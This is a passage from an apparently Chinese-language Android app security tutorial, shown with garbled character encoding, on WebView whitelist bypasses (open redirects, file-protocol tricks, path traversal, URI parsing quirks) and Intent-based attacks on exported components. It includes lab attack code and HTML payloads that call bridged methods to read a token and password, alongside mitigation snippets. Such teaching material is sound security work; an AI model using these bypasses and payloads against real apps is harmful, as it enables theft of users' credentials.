<p>ç›¸å½“äºæ‰§è¡Œäº†ä¸€è¡Œjsä»£ç ï¼Œç¬¬ä¸€è¡Œé€šè¿‡//ç¬¦å·æ¥éª—è¿‡java.net.URIè·å–åˆ°å€¼ä¸ºwww.mysite.comçš„hostï¼Œæ°å¥½//ç¬¦å·åœ¨Javascriptçš„ä¸–ç•Œé‡Œæ˜¯è¡Œæ³¨é‡Šç¬¦å·ï¼Œæ‰€ä»¥ç¬¬ä¸€è¡Œå®é™…å¹¶æ²¡æœ‰æ‰§è¡Œï¼›ç„¶åé€šè¿‡%0d%0aæ¢è¡Œï¼Œç»§ç»­æ‰§è¡Œwindow.location.href=â€™<a target="_blank" rel="noopener" href="http://www.bing.com">http://www.bing.com</a>â€™</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_CY63B8H4GFW7TGH.png" alt="image-20220730132455921"></p>
<p>ä¹Ÿå¯ä»¥é€šè¿‡<code>file://www.mysite.com/sdcard/evil.html</code>ç»•è¿‡ï¼ŒæŸäº›ç‰ˆæœ¬WebViewå¯æ­£å¸¸è§£æä¸º<code>file:///sdcard/evil.html</code></p>
<p>å…¶ä¸­ <strong>window.location.href</strong></p>
<ul>
<li>æ˜¯javascriptä¸­ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å±æ€§ï¼Œå®ƒç”¨äºè·å–æˆ–è®¾ç½®å½“å‰çª—å£æˆ–æ ‡ç­¾é¡µé¢çš„URLã€‚è¿™ä¸ªå±æ€§<strong>è¿”å›å®Œæ•´çš„URL</strong></li>
</ul>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_6G9TXKBZB6B63JZ.png" alt="image-20220730132644522"></p>
<p>ç„¶åè¿›è¡Œæ„é€ html<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_47T7BWXAEHJ3XRX.png" alt="image-20220730132704180"></p>
<p><strong>å®‰å…¨é˜²æŠ¤</strong></p>
<p>URLæ ¡éªŒå‡½æ•°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_JGTPHZEGNU7BAGX.png" alt="image-20220730132918854"></p>
<p><strong>Intent Schemeæ ¡éªŒå»ºè®®å†™æ³•</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//è§£æIntent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> Intent <span class="built_in">int</span>ent = Intent.parseUri(uriï¼Œ flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//ç¦æ­¢æ‰“å¼€æ²¡æœ‰BROWSABLEæ ‡ç­¾çš„Activity</span></span><br><span class="line"><span class="number">4.</span> <span class="built_in">int</span>ent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//ç¦æ­¢è®¾ç½®intentçš„ç»„ä»¶</span></span><br><span class="line"><span class="number">6.</span> <span class="built_in">int</span>ent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//ç¦æ­¢è®¾ç½®intentçš„selector</span></span><br><span class="line"><span class="number">8.</span> <span class="built_in">int</span>ent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//æ‰“å¼€intentæŒ‡å‘çš„activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(<span class="built_in">int</span>entï¼Œ<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<h5 id="æœåŠ¡å™¨è·³è½¬æ¼æ´ç»•è¿‡"><strong>æœåŠ¡å™¨è·³è½¬æ¼æ´ç»•è¿‡</strong></h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>ç™½åå•åŸŸåå†…çš„æœåŠ¡ç«¯å‡ºç°è·³è½¬æ¼æ´æ—¶ï¼Œä»ç„¶å¯ä»¥é€šè¿‡æ£€æŸ¥ï¼Œå¹¶è°ƒç”¨JavascriptInterfaceï¼Œä¾‹å¦‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªè¿™æ ·çš„URL</p>
<p><code>https:</code>/<code>/</code><a target="_blank" rel="noopener" href="http://www.site1.com">www.site1.com</a><code>/</code>redirect.php?url<code>=</code>https:<code>/</code>/<code>www.baidu.com</code></p>
<p>å‰é¢çš„https:<code>/</code>/<code>www.site1.com</code>/<code>redirect.php</code>æ˜¯æˆ‘ä»¬æ„é€ çš„è™šæ‹Ÿç«™ç‚¹ï¼Œå½“ä¸»æœºè®¿é—®æ—¶ï¼Œæ‰“å¼€è¿™ä¸ªurlåï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ª302å“åº”ï¼Œç„¶åæµè§ˆå™¨ä¼šè¯·æ±‚æŒ‡å®šçš„URLï¼Œå¯¹äºå…·æœ‰å•ç‚¹ç™»å½•åŠŸèƒ½çš„ç½‘ç«™ï¼Œè¿™ç§ç±»å‹çš„æ¥å£å¾ˆå¸¸è§ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ„é€ URLæ¥ç»•è¿‡åŸŸåç™½åå•ï¼š</p>
<p><code>https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</code></p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>é¦–å…ˆæˆ‘ä»¬ç¼–å†™æ”»å‡»çš„htmï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶æœåŠ¡å™¨æ¥è¿›è¡Œæ¨¡æ‹Ÿ<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_ABKZHS9QBDVBZH8.png" alt="image-20220730114753663"></p>
<p>æˆ‘ä»¬æ¥ç€ç¼–å†™æµ‹è¯•æ ·æœ¬ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"> </span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ipåœ°å€è‡ªå·±å†™è‡ªå·±çš„</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//æå–host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ†æä»£ç ä¸­æœ‰ä¸€ä¸ªç™½åå•çš„åŸŸåæ£€æµ‹å‡½æ•°<code>checkDomain</code>,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ URLæ¥ç»•è¿‡ï¼š</p>
<p><code>https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</code></p>
<h5 id="fileåè®®ç»•è¿‡">fileåè®®ç»•è¿‡</h5>
<p><a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URLæ£€æŸ¥ç»•è¿‡</a></p>
<p>appç»å¸¸ä¼šä½¿ç”¨file://åè®®åŠ è½½æœ¬åœ°æ–‡ä»¶ï¼Œé€šå¸¸ä¼šé™åˆ¶åœ¨ä¸€äº›ç‰¹å®šçš„è·¯å¾„ä¸­ï¼Œ</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)ä¸è¦ç”¨url.startWith(â€file:<span class="regexp">//</span>â€)æ¥åˆ¤æ–­æ˜¯å¦ä¸ºfileåè®®ï¼Œå› ä¸ºâ€œFILE:<span class="regexp">//</span>â€(å¤§å°)ã€â€œFile:<span class="regexp">//</span>â€(å¤§å°å†™)ã€â€œ file:<span class="regexp">//</span>â€(å‰è¾¹åŠ ç©ºæ ¼)ã€â€œfile:â€ç­‰æ–¹å¼éƒ½å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚url.contains(â€œfile:<span class="regexp">//</span>â€)æ›´ä¸é è°±ï¼Œæ¨èä½¿ç”¨getScheme()æ¥åˆ¤æ–­åè®®ï¼›</span><br><span class="line">(<span class="number">2</span>)file:<span class="regexp">//</span><span class="regexp">/android_assetå’Œfile:/</span><span class="regexp">//</span>android_res ä¹Ÿå¯ä»¥../ç©¿è¶Š</span><br><span class="line">(<span class="number">3</span>)ç™½åå•åˆ¤æ–­äº†â€œ..<span class="regexp">/ï¼Œä½†é€šè¿‡â€œ..\â€ä¹Ÿæ˜¯å¯ä»¥ç©¿è¶Šçš„ï¼Œä¾‹å¦‚file:/</span><span class="regexp">//</span>sdcard<span class="regexp">/..\../</span>sdcard/<span class="number">1</span>.html</span><br><span class="line">(<span class="number">4</span>)getHostæœ‰æ¼æ´ï¼ˆfile:<span class="regexp">//</span>a:a@www.qq.com:b@www.baidu.comä½¿ç”¨getHostè·å–åˆ°çš„æ˜¯qq.com,ä½†å®é™…è®¿é—®çš„æ˜¯baidu.com)</span><br><span class="line">(<span class="number">5</span>)file:<span class="regexp">//</span>baidu.com<span class="regexp">/data/</span>data/tmp å‰è¾¹çš„baidu.comæ˜¯å¯ä»¥ä¸è¢«è§£æçš„</span><br><span class="line">(<span class="number">6</span>)åè®®å¤´ä¸åŒ…æ‹¬<span class="regexp">//</span><span class="regexp">/ï¼Œè¿˜æ˜¯ä»ç„¶èƒ½å¤Ÿæ­£å¸¸loadUrlï¼Œå¦‚file:mnt/</span>sdcard/filedomain.html</span><br><span class="line">(<span class="number">7</span>)ç™½åå•åˆ¤æ–­äº†â€œ..<span class="regexp">/â€ï¼Œä½†é€šè¿‡urlç¼–ç ç»•è¿‡ï¼Œä¾‹å¦‚file:/</span><span class="regexp">//</span>data<span class="regexp">/data/</span>com.app<span class="regexp">/%2e%2e/</span>%<span class="number">2</span>e%<span class="number">2</span>e<span class="regexp">/%2e%2e/</span>sdcard/xxx</span><br><span class="line">(<span class="number">8</span>)replace(â€œ..<span class="regexp">/â€œ,â€â€) å¯ä»¥ä½¿ç”¨â€â€¦./</span><span class="regexp">/â€œç»•è¿‡  æ›¿æ¢ä¸€ä¸ª../</span> è¿˜æœ‰../å­˜åœ¨</span><br></pre></td></tr></table></figure>
<h4 id="Intent-WebView">Intent + WebView</h4>
<h5 id="Intentè®¿é—®å¯¼å‡ºç»„ä»¶åŠ è½½æ¶æ„ç•Œé¢å’Œçªƒå–ä¿¡æ¯"><strong>Intentè®¿é—®å¯¼å‡ºç»„ä»¶åŠ è½½æ¶æ„ç•Œé¢å’Œçªƒå–ä¿¡æ¯</strong></h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>ä¸»è¦é€šè¿‡WebViewå¯¹å¤–æš´éœ²çš„æ¥å£å’ŒIntentè®¿é—®å¯¼å‡ºç»„ä»¶å¯ä»¥å¯¼è‡´çš„æ”»å‡»æ‰‹æ®µ</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ ·ä¾‹ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æä¾›æ¥å£åœ¨Webviewä¸­ä¾›JSè°ƒç”¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰JSéœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè¢«JSè°ƒç”¨çš„æ–¹æ³•å¿…é¡»åŠ å…¥@JavascriptInterfaceæ³¨è§£</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæˆ‘ä»¬è·å–äº†å¯†ç <code>WindXaa12345678</code>ï¼Œä¸€èˆ¬åº”ç”¨ç¨‹åºä¼šå¯¹è¿™é‡Œè¿›è¡ŒåŠ å¯†æˆ–è€…æ··æ·†ï¼Œæˆ‘ä»¬è¿™é‡Œç®€å•æ¼”ç¤ºå°±ä¸è¿›è¡ŒåŠ å¯†äº†</p>
<p>æˆ‘ä»¬å°†è¯¥ç»„ä»¶è®¾ç½®ä¸ºå¯¼å‡ºç»„ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_8793MBMDUVDZESQ.png" alt="image-20220729171422196"></p>
<p>æˆ‘ä»¬å¯¹å®ä¾‹æ ·æœ¬åˆ†æï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨æ¥å£å¯¼å‡ºçš„æ¼æ´è¿›è¡Œæ”»å‡»</p>
<p>ç¼–å†™æ”»å‡»æ ·æœ¬:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ipåœ°å€ç«¯å£å·/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬åœ¨æœ¬åœ°ç¼–å†™æ¶æ„çš„htmlï¼Œåˆ©ç”¨å‰é¢è®²è¿°çš„è¿œç¨‹åŠ è½½</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//ç”±äºå¯¹è±¡æ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨testå¯¹è±¡ç­‰äºè°ƒç”¨Androidæ˜ å°„çš„å¯¹è±¡</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>æ”»å‡»è·å¾—çš„æ•°æ®å°†æ˜¾ç¤ºåœ¨æ­¤â€¦â€¦<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--ç‚¹å‡»æŒ‰é’®åˆ™è°ƒç”¨callAndroidå‡½æ•°--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>ç„¶åå¯åŠ¨http_server</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_25GBQWTFBW4APF8.png" alt="image-20220729172309137"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å¯åŠ¨æ”»å‡»æ ·æœ¬ï¼Œå¹¶ç‚¹å‡»æŒ‰é’®ï¼Œå°±èƒ½åŠ è½½æˆ‘ä»¬çš„æ¶æ„htmlï¼Œè¿›è€Œè·å¾—æ•æ„Ÿä¿¡æ¯</p>
<h5 id="Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´"><strong>Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´</strong></h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>å¯¼å‡ºç»„ä»¶å¾€å¾€å­˜åœ¨ä¸€å®šçš„å®‰å…¨é—®é¢˜</p>
<p>å¯¼å‡ºç»„ä»¶ä¸€èˆ¬æœ‰ä¸‹é¢ä¸‰ç§å½¢å¼ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>åœ¨AndroidManifest.xmlä¸­çš„ç»„ä»¶å¦‚æœæ˜¾å¼è®¾ç½®äº†ç»„ä»¶å±æ€§android:exportedå€¼ä¸º<span class="keyword">true</span>;</span><br><span class="line"><span class="number">2.</span>å¦‚æœç»„ä»¶æ²¡æœ‰æ˜¾å¼è®¾ç½®android:exportedä¸º<span class="keyword">false</span>ï¼Œä½†æ˜¯å…¶intent-<span class="keyword">filter</span>ä»¥åŠactionå­˜åœ¨ï¼Œåˆ™ä¹Ÿä¸ºå¯¼å‡ºç»„ä»¶</span><br><span class="line"><span class="number">3.</span>API <span class="keyword">Level</span>åœ¨<span class="number">17</span>ä»¥ä¸‹çš„æ‰€æœ‰Appçš„providerç»„ä»¶çš„android:exportedå±æ€§é»˜è®¤å€¼ä¸º<span class="keyword">true</span>ï¼Œ<span class="number">17</span>åŠä»¥ä¸Šé»˜è®¤å€¼ä¸º<span class="keyword">false</span>ã€‚</span><br></pre></td></tr></table></figure>
<p>æœªå¯¼å‡ºç»„ä»¶</p>
